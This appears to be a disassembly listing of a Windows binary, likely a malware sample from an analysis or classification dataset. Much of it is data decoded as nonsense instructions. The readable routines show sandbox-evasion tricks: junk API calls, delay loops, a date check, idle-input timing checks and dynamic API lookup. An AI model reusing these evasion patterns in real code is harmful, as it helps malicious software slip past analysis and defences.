jpe r-xdata
scasd [ edi ]
scasd [ edi ]
lodsd [ esi ]
int 0x25
test al 0xc5
add eax 0x43367af1
add [ ecx ] eax
outsb
outsb
outsb
outsb
stosd [ edi ]
push ds
pop ss
add eax 0x6e010131
outsb
outsb
outsb
outsb
outsb
outsb
outsb
jne r-xdata
push cs
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
cwde
ja r-xdata
inc ebx
add [ ecx ] eax
pop ss
xchg edx eax
sub [ ecx ] eax
add [ esi + 0x6e ] ebp
mov eax 0x6efefef9
outsb
outsb
outsb
outsb
outsb
outsb
outsb
cmp [ ebx - 0x6b016bf1 ] edi
jpo r-xdata
and eax 0xb8174355
stc
int1
jpe r-xdata
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
xchg esi eax
or bh bh
sub al 0x1
add [ esi + 0x43552542 ] edx
pop ss
sub_47600b
xchg esp eax
nop
jne r-xdata
add [ edx - 0x56fe0926 ] ecx
rcl [ esi + edi * 8 - 0x1ad96ff ] cl
pop ss
popad
or eax 0x6e6e0101
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
xchg esi eax
or bh bh
sub_47609d
dec [ ecx ]
pop es
test eax 0x119dd17
add [ esi + 0x6e ] ebp
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
mov al [ 0x6e6e3da5 ]
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
jne r-xdata
test [ ecx ] 0x8b
or dl [ esi ]
jae r-xdata
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
lodsd [ esi ]
mov ecx 0xfe526801
add [ ecx ] eax
pop ss
add ah [ edi ]
add [ ecx ] eax
test al 0x17
outsb
dec esi
add [ ecx ] eax
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
sub_476171
std
mov ebp edx
mov edi 0xf1f2b3c5
jl r-xdata
pop ss
outsb
dec esi
add [ ecx ] eax
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
lodsd [ esi ]
mov ecx 0xfe526801
or [ ecx ] al
add [ eax - 0x5c5ec68b ] esp
outsb
push ss
add eax [ ss : ecx ]
add [ esi ] edx
dec esi
add [ ecx ] eax
outsb
outsb
outsb
outsb
add [ esi + 0x28b019a ] ebp
pop ss
mov al 0xc
add [ ecx ] eax
outsb
jne r-xdata
push ss
add [ ecx ] eax
pop ss
int 0x11
add [ ecx ] eax
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
add [ ebx - 0x9448a0e ] ecx
add [ esi + 0x7d37cd9a ] ebp
push es
add ecx esi
imul edi [ edi ] 0x75
aas
mov eax [ 0x3d37a5a0 ]
outsb
outsb
outsb
jae r-xdata
cmp eax 0x6e6e6e6e
jae r-xdata
mov al [ 0xffffffffa3a13975 ]
salc
jne r-xdata
inc edx
xor al 0x1
add [ ebx + 0x3e ] edi
int1
jpe r-xdata
in al dx
and eax 0x166e0101
test al 0xae
push ss
cld
sti
outsb
push ss
add [ ecx ] eax
pop ss
outsb
add [ ecx ] eax
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
add [ ecx ] eax
push ss
push es
pop ss

sub_4761b5
mov ebx 0x4e691706
mov al [ 0xffffffffa3a13975 ]
cmp eax 0x6e6e6e6e
jae r-xdata
salc
jne r-xdata
outsb
push ss
add eax [ ss : ecx ]
add [ esi ] edx
outsb
push ss
add [ ecx ] eax
pop ss
outsb
add [ ecx ] eax
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
add [ ecx ] eax
push ss
push es
pop ss

add [ ecx ] eax
outsb
outsb
outsb
outsb
add [ esi + 0x28b019a ] ebp
pop ss
mov al 0xc
add [ ecx ] eax
outsb
jne r-xdata
dec esi
push ss
add [ ecx ] eax
pop ss
int 0x11
add [ ecx ] eax
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
add [ ebx - 0x9448a0e ] ecx
add [ esi + 0x7d37cd9a ] ebp
push es
add ecx esi
imul edi [ edi ] 0x75
aas
mov eax [ 0x3d37a5a0 ]
outsb
outsb
outsb
jae r-xdata
inc edx
xor al 0x1
add [ ebx + 0x3e ] edi
int1
jpe r-xdata
in al dx
and eax 0x166e0101
test al 0xae
push ss
cld
sti
sub_4763cf
pop ss
inc edi
and al [ ecx ]
add [ esi - 0x6c ] ebp
mov edx 0xad56bb73
pop ss
xchg [ 0x6e6e0101 ] bh
outsb
outsb
int1
jpe r-xdata
add [ ecx ] eax
outsb
jge r-xdata
add [ ecx ] eax
add [ ebp + 0x36 ] esi
jae r-xdata
outsb
outsb
outsb
outsb
outsb
outsb
outsb
xchg esp eax
add [ edi ] edx
mov eax [ 0x6e010139 ]
r-xdata
add [ ebp - 0x46 ] esi
xchg [ ebx ] al
add [ ecx ] eax
push ss
rcr [ eax ] cl
add [ ecx ] eax
jae r-xdata
pop ss
stosb [ edi ]
pop es
add [ ecx ] eax
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
cli
jae r-xdata
r-xdata
adc al [ ebx ]
add [ ecx ] eax
scasb [ edi ]
add [ ecx + 0x167b73d2 ] ebp
add al [ ecx ]
add [ esi + 0x1373f16 ] ebp
add [ esi + 0x167b73ae ] edi
add al [ ecx ]
add [ esi + 0x3127b73 ] ebp
add [ ecx ] eax
scasb [ edi ]
jne r-xdata
add [ ecx ] eax
add [ ecx + 0x56 ] ebp
and ch [ esi - 0x5181448d ]
pop ss
xchg edx eax
sbb al [ ecx ]
add [ esi + 0x7d ] ebp
cmp dh dl
jae r-xdata
outsb
outsb
push 0xffffffae
test al 0x73
jae r-xdata
outsb
aaa
cmp eax 0x6e6e6e6e
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
jae r-xdata
fisubr [ esi - 0x2 ]
outsb
outsb
outsb
outsb
outsb
outsb
outsb
int1
jpe r-xdata
mov eax 0x6e01014b
outsb
outsb
outsb
push ss
dec [ edx + 0x1 ]
add [ ebp + 0x3a ] edi
out dx al
pop ss
push ss
add eax [ ecx ]
add [ edi ] edx
pop ecx
push ss
add [ ecx ] eax
outsb
outsb
outsb
outsb
push ss
add [ es : ecx ] eax
pop ss
cmp [ edi ] dh
add [ ecx ] eax
outsb
outsb
xchg esp eax
cdq
cwde
ja r-xdata
mov edx 0xce01eeda
sti
cmp eax 0x91940101
cmpsb [ esi ] [ edi ]
xchg esp eax
mov ds [ eax - 0x3d254589 ]
ja r-xdata
adc ah [ eax + ebx * 4 + 0x75c6ab77 ]
add [ eax + 0x75108377 ] bl
sub [ eax + 0x75c4ab77 ] bl
push es
jpe r-xdata
mov al [ 0x6e3d37a5 ]
outsb
outsb
outsb
outsb
outsb
outsb
jge r-xdata
cmpsb [ esi ] [ edi ]
fcmovb st2
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
push cs
jne r-xdata
xchg [ esi ] ah
add [ ecx ] eax
xchg esi eax
mov cl 0x5
xor bl 0xa9
ja r-xdata
cwde
ja r-xdata
jne r-xdata
xchg esp eax
add [ es : ecx ] eax
xchg esi eax
push ds
retn
rcl [ esi ] cl
outsb
retn 0x775
add [ esi + 0x6e ] ebp
push ss
js r-xdata
cwde
ja r-xdata
inc esi
add [ ecx ] eax
xchg esi eax
jg r-xdata
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
cwde
ja r-xdata
les esi [ ebp + 0x6 ]
outsb
outsb
retn
sub_476465
push ss
add al 0x1b
add [ ecx ] eax
jne r-xdata
scasb [ edi ]
jae r-xdata
outsb
outsb
outsb
outsb
outsb
adc al [ ebx ]
add [ ecx ] eax
scasb [ edi ]
jne r-xdata
outsb
outsb
push 0xffffffae
test al 0x73
jae r-xdata
mov eax 0x6e01014b
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
xchg esp eax
add [ edi ] edx
mov eax [ 0x6e010139 ]
push ss
dec [ edx + 0x1 ]
add [ ebp + 0x3a ] edi
out dx al
pop ss
push ss
add eax [ ecx ]
add [ edi ] edx
pop ecx
push ss
add [ ecx ] eax
outsb
outsb
outsb
outsb
push ss
add [ es : ecx ] eax
pop ss
cmp [ edi ] dh
add [ ecx ] eax
outsb
outsb
xchg esp eax
cdq
cwde
ja r-xdata
pop ss
stosb [ edi ]
pop es
add [ ecx ] eax
outsb
outsb
outsb
outsb
outsb
outsb
cli
jae r-xdata
ja r-xdata
adc ah [ eax + ebx * 4 + 0x75c6ab77 ]
add [ eax + 0x75108377 ] bl
sub [ eax + 0x75c4ab77 ] bl
push es
outsb
aaa
cmp eax 0x6e6e6e6e
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
jae r-xdata
fisubr [ esi - 0x2 ]
mov al [ 0x6e3d37a5 ]
outsb
outsb
outsb
outsb
outsb
outsb
jge r-xdata
fcmovb st2
cmpsb [ esi ] [ edi ]
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
push cs
jne r-xdata
xchg [ esi ] ah
add [ ecx ] eax
xchg esi eax
mov cl 0x5
xor bl 0xa9
ja r-xdata
cwde
ja r-xdata
jne r-xdata
xchg esp eax
add [ es : ecx ] eax
xchg esi eax
push ds
retn
rcl [ esi ] cl
outsb
retn 0x775
add [ esi + 0x6e ] ebp
push ss
js r-xdata
cwde
ja r-xdata
inc esi
add [ ecx ] eax
xchg esi eax
jg r-xdata
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
cwde
ja r-xdata
les esi [ ebp + 0x6 ]
outsb
outsb
retn
sub_47647d
scasb [ edi ]
push ss
dec ebp
dec ebp
add [ ecx ] eax
jge r-xdata
outsb
outsb
outsb
outsb
outsb
outsb
outsb
r-xdata
outsb
outsb
push 0xffffffae
test al 0x73
jae r-xdata
outsb
outsb
outsb
outsb
outsb
outsb
outsb
int1
jpe r-xdata
push ss
add eax [ ecx ]
add [ edi ] edx
pop ecx
push ss
add [ ecx ] eax
outsb
outsb
outsb
outsb
push ss
add [ es : ecx ] eax
pop ss
cmp [ edi ] dh
add [ ecx ] eax
outsb
outsb
xchg esp eax
cdq
cwde
ja r-xdata
mov edx 0xce01eeda
sti
cmp eax 0x91940101
cmpsb [ esi ] [ edi ]
xchg esp eax
mov ds [ eax - 0x3d254589 ]
ja r-xdata
adc ah [ eax + ebx * 4 + 0x75c6ab77 ]
add [ eax + 0x75108377 ] bl
sub [ eax + 0x75c4ab77 ] bl
push es
jpe r-xdata
mov al [ 0x6e3d37a5 ]
outsb
outsb
outsb
outsb
outsb
outsb
jge r-xdata
cmpsb [ esi ] [ edi ]
fcmovb st2
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
push cs
jne r-xdata
pop ss
stosb [ edi ]
pop es
add [ ecx ] eax
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
cli
jae r-xdata
xchg [ esi ] ah
add [ ecx ] eax
xchg esi eax
mov cl 0x5
xor bl 0xa9
ja r-xdata
cwde
ja r-xdata
outsb
aaa
cmp eax 0x6e6e6e6e
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
jae r-xdata
fisubr [ esi - 0x2 ]
jne r-xdata
xchg esp eax
add [ es : ecx ] eax
xchg esi eax
push ds
retn
rcl [ esi ] cl
outsb
retn 0x775
add [ esi + 0x6e ] ebp
push ss
js r-xdata
cwde
ja r-xdata
inc esi
add [ ecx ] eax
xchg esi eax
jg r-xdata
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
cwde
ja r-xdata
les esi [ ebp + 0x6 ]
outsb
outsb
retn
sub_476554
test eax 0x1682b877
jne r-xdata
rcl [ esi ] cl
add [ esi + 0x6e ] ebp
push ss
js r-xdata
cwde
ja r-xdata
inc esi
add [ ecx ] eax
xchg esi eax
jg r-xdata
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
les esi [ ebp + 0x6 ]
outsb
outsb
retn
outsb
outsb
push 0xffffffae
test al 0x73
jae r-xdata
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
push cs
jne r-xdata
xchg esp eax
add [ es : ecx ] eax
xchg esi eax
push ds
retn
push ss
add eax [ ecx ]
add [ edi ] edx
pop ecx
push ss
add [ ecx ] eax
outsb
outsb
outsb
outsb
push ss
add [ es : ecx ] eax
pop ss
cmp [ edi ] dh
add [ ecx ] eax
outsb
outsb
xchg esp eax
cdq
cwde
ja r-xdata
xchg [ esi ] ah
add [ ecx ] eax
xchg esi eax
mov cl 0x5
xor bl 0xa9
ja r-xdata
cwde
ja r-xdata
ja r-xdata
cwde
ja r-xdata
adc ah [ eax + ebx * 4 + 0x75c6ab77 ]
add [ eax + 0x75108377 ] bl
sub [ eax + 0x75c4ab77 ] bl
push es
outsb
retn 0x775
mov al [ 0x6e3d37a5 ]
outsb
outsb
outsb
outsb
outsb
outsb
jge r-xdata
fcmovb st2
cmpsb [ esi ] [ edi ]
pop ss
stosb [ edi ]
pop es
add [ ecx ] eax
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
cli
jae r-xdata
outsb
aaa
cmp eax 0x6e6e6e6e
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
jae r-xdata
fisubr [ esi - 0x2 ]
sub_4767cc
0xbe75ff75 0x75f2
mov esi 0x75fe75f2
mov esi 0xdafa77e6
jne r-xdata
out 0x77 al
cli
fidiv [ ebp - 0x6 ]
ficom [ edi ]
shl [ 0x6e6e0101 ] cl
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
lodsd [ esi ]
lodsd [ esi ]
jae r-xdata
mov [ 0x1725cdd6 ] eax
jle r-xdata
pop ss
enter 0x13b 0x1
outsb
outsb
outsb
outsb
add [ ecx ] eax
scasb [ edi ]
add [ edi ] edx
sub eax 0x6e010133
outsb
outsb
outsb
aad 0xc
int1
dec ecx
hlt
int1
jpe r-xdata
jpo r-xdata
adc eax [ ecx ]
add [ esi ] edx
xor cl [ eax + 0x1 ]
add [ edi ] edx
and [ ecx ] 0x1
add ecx esi
imul edi [ edi ] 0x75
sub_476818
add [ 0xffffffffed173875 ] ebp
add al 0x1
add [ esi + 0x6e ] ebp
outsb
outsb
cmpsb [ esi ] [ edi ]
cwde
ja r-xdata
add [ esi + 0x6e ] ebp
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
lodsd [ esi ]
lodsd [ esi ]
jae r-xdata
or ch cl
xchg esp eax
0x144bf17 0x6e01
mov [ 0x1725cdd6 ] eax
jle r-xdata
pop ss
enter 0x13b 0x1
outsb
outsb
outsb
outsb
add [ ecx ] eax
scasb [ edi ]
add [ edi ] edx
sub eax 0x6e010133
outsb
outsb
outsb
aad 0xc
int1
dec ecx
hlt
int1
jpe r-xdata
jpo r-xdata
adc eax [ ecx ]
add [ esi ] edx
xor cl [ eax + 0x1 ]
add [ edi ] edx
and [ ecx ] 0x1
add ecx esi
imul edi [ edi ] 0x75
sub_476892
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
int1
dec ecx
out dx eax
pop ss
aam 0x3
add [ ecx ] eax
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
push ss
and al [ ecx + 0x1 ]
add [ ebp + 0x3a ] edi
0x9c173e7b 0x120
sub_476bf0
int1
jpe r-xdata
outsb
outsb
outsb
outsb
outsb
cwde
ja r-xdata
xor al 0x1
add [ edi ] edx
cdq
or [ ecx ] eax
add [ esi + 0x6e ] ebp
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
jg r-xdata
sub [ esp + edx * 4 - 0x54886722 ] ah
jne r-xdata
pop ss
in eax dx
push eax
jne r-xdata
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
out dx al
cli
cwde
lds edi [ eax + 0x229217f8 ]
add [ ecx ] eax
outsb
outsb
pop ss
jmp [ ecx ]
add [ esi + 0x6e ] ebp
pop ss
sahf
adc [ ecx ] al
add [ ebx - 0x45 ] esi
push es
pop ss
adc eax 0x6e01013e
outsb
ficomp [ eax + 0x7526ab77 ]
das
scasb [ edi ]
push esi
add [ ecx ] eax
outsb
outsb
outsb
outsb
outsb
jae r-xdata
int 0x8
jne r-xdata
jne r-xdata
xchg esp eax
[ eax + 0x4e96fd94 ]
sub eax 0xf6387d05
pop ss
loop r-xdata
aaa
mov edi 0xe51736d5
add [ ecx ] al
add [ eax + 0x750c8377 ] ebx
pop es
cwde
ja r-xdata
add [ ecx ] eax
outsb
outsb
outsb
ja r-xdata
outsb
outsb
outsb
jne r-xdata
outsb
or dl [ edi ]
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
cwde
ja r-xdata
outsb
outsb
jae r-xdata
or bl [ eax + 0x17f8b8c5 ]
xchg edx eax
and al [ ecx ]
add [ esi + 0x6e ] ebp
sub_476df8
push ebx
mov edx ecx
test edx edx
jbe r-xdata
xor eax eax
pop ebx
retn
mov ecx 0x1
mov ebx ecx
add ebx eax
mov [ ebx ] 0x52
nop
nop
inc ecx
dec edx
jne r-xdata
sub_476e18
push ebx
nop
nop
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call CreateMDIWindowA
test eax eax
je r-xdata
call GetLastError
cmp eax 0x578
jne r-xdata
nop
nop
pop ebx
retn
pop ebx
retn
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call DrawStateA
mov ebx 0xb966c8b
dec ebx
jne r-xdata
push 0x4
push 0x3000
push 0x1daa1e73
push 0x0
call VirtualAlloc
mov ebx eax
nop
test ebx ebx
jne r-xdata
nop
nop
mov ecx 0x1daa1e73
xor edx edx
mov eax ebx
call sub_476df8
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call DrawStateA
push 0x8000
push 0x0
push ebx
call VirtualFree
nop
nop
mov ebx 0xb55d
nop
nop
pop ebx
retn
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call DrawStateA
dec ebx
jne r-xdata
nop
push 0x0
call sub_471094
nop
sub_476ef0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_476f15
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476f1c
retn
sub_476f20
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi rw-data
xor eax eax
push ebp
push j_sub_4039d0
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477119
lea eax [ ebp - 0x4 ]
call sub_404050
retn
push 0x0
push 0x0
call SelectClipRgn
call GetLastError
cmp eax 0x6
jne r-xdata
lea edx [ ebp - 0x4 ]
xor eax eax
call sub_402a0c
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_40c2ac
test eax eax
je r-xdata
nop
mov ebx 0x1505
nop
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call DrawStateA
dec ebx
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call DrawStateA
mov ebx 0x2384c
nop
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call DrawStateA
dec ebx
jne r-xdata
push 0x4
push 0x3000
push 0x284f9ca5
push 0x0
call VirtualAlloc
mov ebx eax
test ebx ebx
jne r-xdata
nop
mov ecx 0x284f9ca5
xor edx edx
mov eax ebx
call sub_476df8
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call DrawStateA
push 0x8000
push 0x0
push ebx
call VirtualFree
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call DrawStateA
nop
mov ebx 0x87b5
nop
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call DrawStateA
dec ebx
jne r-xdata
nop
nop
xor ebx ebx
xor edi edi
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
nop
mov [ rw-data ] 0x0
push rw-data
call GetLocalTime
cmp [ rw-data ] 0x7e1
jae r-xdata
jmp r-xdata
nop
nop
jmp r-xdata
cmp ebx 0x13
jle r-xdata
cmp edi [ esi + 0x4 ]
je r-xdata
mov [ esi ] 0x8
push esi
call GetLastInputInfo
nop
call GetTickCount
sub eax [ esi + 0x4 ]
cmp eax 0x72
jae r-xdata
call sub_476e18
nop
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call DrawStateA
mov edi [ esi + 0x4 ]
nop
inc ebx
nop
sub_47718b
add [ esi + ebx * 2 + 0x40 ] bh
add [ esi + ebx * 2 + 0x40 ] cl
add [ eax + 0x5c ] dh
inc eax
add [ esp + ebx * 2 ] bl
inc eax
add ah dh
pop esi
inc eax
add ah al
pop esi
inc eax
add [ esp + ebp * 2 ] cl
inc eax
add ah bl
imul eax [ eax ] 0x44
insb
inc eax
add [ esp + ebp * 2 ] dl
inc eax
add [ eax + 0x70004113 ] ah
adc eax [ ecx ]
pop esp
outsd
inc eax
add [ edi + ebp * 2 ] ch
inc eax
add [ edi + edx * 8 ] bh
inc eax
add [ ebp + edx * 8 - 0x2057ffc0 ] bh
inc eax
add [ eax - 0x21 ] bh
inc eax
add [ eax + 0x9 ] dl
inc ecx
add al bl
or [ ecx ] al
sub al 0xb
inc ecx
add ah bh
or al [ ecx ]
push 0x18004113
adc eax [ ecx ]
sbb al 0xbc
inc ecx
add [ ebx + edi * 4 + 0x41 ] ch
add [ eax ] dh
xor eax [ edx ]
add [ ebx ] dh
inc edx
add al ch
xor eax 0x35b80042
inc edx
add [ esi + ecx * 2 + 0x4e540042 ] dl
inc edx
add [ esi + edi + 0x42 ] bl
add [ esi + edi ] ch
inc edx
add ah bl
inc edx
add [ esi + esi - 0x408fffbe ] ch
inc ecx
add [ eax - 0x41 ] al
inc ecx
add ah dh
xor [ edx ] eax
and [ ecx ] dh
inc edx
add al ch
push edi
inc esp
add [ eax - 0x63ffbba9 ] bh
inc edx
add [ esi + edi + 0x42 ] ch
add [ ebp + edi * 4 - 0x42cbffbc ] ah
inc esp
add al bh
pushad
inc edx
add al cl
pushad
inc edx
add [ eax + 0x4c00426a ] ah
push 0x42
add [ esp + ebp * 2 ] al
inc edx
add ah dl
imul eax [ edx ] 0xffffffcc
imul eax [ edx ] 0xffffff9c
imul eax [ edx ] 0xffffff94
imul eax [ edx ] 0x64
imul eax [ edx ] 0x5c
imul eax [ edx ] 0x2c
imul eax [ edx ] 0x70
insb
inc edx
add [ eax + 0x6c ] al
inc edx
add al dl
mov al 0x42
add [ eax - 0x53ffbd50 ] ah
adc eax 0x157c0043
inc ebx
add ah ch
dec esi
inc edx
add [ esi + ecx * 2 + 0x5c340042 ] bh
inc edx
add al bh
pop ebx
inc edx
add al ah
insb
inc edx
add [ eax + 0x1800426c ] dh
insd
inc edx
add al ch
insb
inc edx
add [ esi + 0x42 ] al
add al ch
movsd [ edi ] [ esi ]
inc edx
add [ eax + 0x600042ac ] ch
lodsb [ esi ]
inc edx
add [ ebx + ebp * 2 ] ah
inc edx
add ah dh
push 0x42
add ah ch
push 0x42
add [ edx + ebp * 2 - 0x5093ffbe ] bh
inc edx
add [ edi + ebp * 4 ] ah
inc edx
add ah dl
scasd [ edi ]
inc edx
add [ edi + ebp * 4 - 0x5153ffbe ] cl
inc edx
add [ esi + ebp * 4 + 0x42 ] dh
add [ edi + ebp * 4 ] al
inc edx
add ah dl
scasb [ edi ]
inc edx
add ah dl
lodsd [ esi ]
inc edx
add [ ebp + ebp * 4 - 0x52b3ffbe ] ah
inc edx
add [ eax ] dl
lodsd [ esi ]
inc edx
add [ edi + edx ] dl
inc ebx
add ah ah
push ss
inc ebx
add [ eax - 0x50 ] al
inc edx
add al dh
scasd [ edi ]
inc edx
add [ eax + 0x480042b0 ] bl
mov al 0x42
add [ eax ] cl
lodsd [ esi ]
inc edx
add al bl
lodsb [ esi ]
inc edx
add [ eax - 0x4e ] dl
inc edx
add al bl
mov cl 0x42
add [ esp + edi * 4 + 0x42 ] bl
add [ eax ] bl
mov esp 0x2de80042
inc esp
add [ eax - 0x1fffbbd3 ] al
inc eax
inc esp
add [ eax - 0x1fffbbc0 ] dh
and eax [ ebx ]
push 0x4c004323
pop edi
inc edx
add [ edi + ebx * 2 ] bl
inc edx
add [ eax - 0x7e ] ah
inc ebp
add [ edx + eax * 4 ] al
inc ebp
add [ ebx + eax * 4 ] bh
inc ebp
add [ ebx + eax * 4 ] cl
inc ebp
add [ eax ] ah
xchg ebx eax
inc ebp
add al ch
xchg edx eax
inc ebp
add [ edi + ebx * 4 ] al
inc ebp
add ah dl
sahf
inc ebp
add [ edx + 0x45 ] ah
add [ edx ] dh
inc ebp
add [ eax ] ch
iretd
sub_477376
inc ebp
add al bh
into
inc ebp
add [ ebx + esi * 4 - 0x4cb3ffbb ] al
inc ebp
add ah al
mov bl 0x45
add [ ebx + esi * 4 - 0x4223ffbb ] dl
inc ebp
add [ ebp + edi * 4 - 0x3133ffbb ] ch
inc ebp
add [ eax - 0x7ffba32 ] cl
aad 0x45
add [ edx * 8 + 0x35a40045 ] bh
inc esi
add [ ebp + esi + 0x46 ] dh
add [ eax + ebx * 8 ] cl
inc ebp
add ah bl
xlat
inc ebp
add al bh
fiadd [ ebp ]
enter 0x45da 0x0
and cl ah
inc ebp
add al bl
loopne r-xdata
pop esp
inc esi
add ah dl
loop r-xdata
mov ecx 0xb9500046
inc esi
add al dl
jbe r-xdata
inc esi
add al dl
inc esi
add al al
inc esi
add [ eax + 0x40004636 ] dl
dec ebp
inc esi
add [ eax ] dl
dec ebp
inc esi
add al dh
push edx
inc esi
add al al
push edx
inc esi
add [ eax + 0x4b ] dh
inc esi
add [ eax + 0x4b ] al
inc esi
add [ eax + edx * 2 ] ch
inc esi
add ah bh
dec edi
inc esi
add [ edi + ecx * 2 + 0x4f6c0046 ] bl
inc esi
add [ eax ] al
ja r-xdata
add [ edi ] ch
add [ eax ] al
das
add [ edx - 0x6afffbb ] ah
inc ebp
add [ eax ] ah
stc
inc ebp
add [ eax - 0x1f ] bh
inc ebp
add [ eax - 0x1f ] cl
inc ebp
add [ esi + ebp * 8 ] ch
inc ebp
add ah bh
in eax dx
inc ebp
add [ esp + eax + 0x48c0046 ] bh
inc esi
add [ ebp + edi * 8 - 0x273ffbb ] bh
inc ebp
add [ eax + 0x68004605 ] bl
add eax 0x88c0046
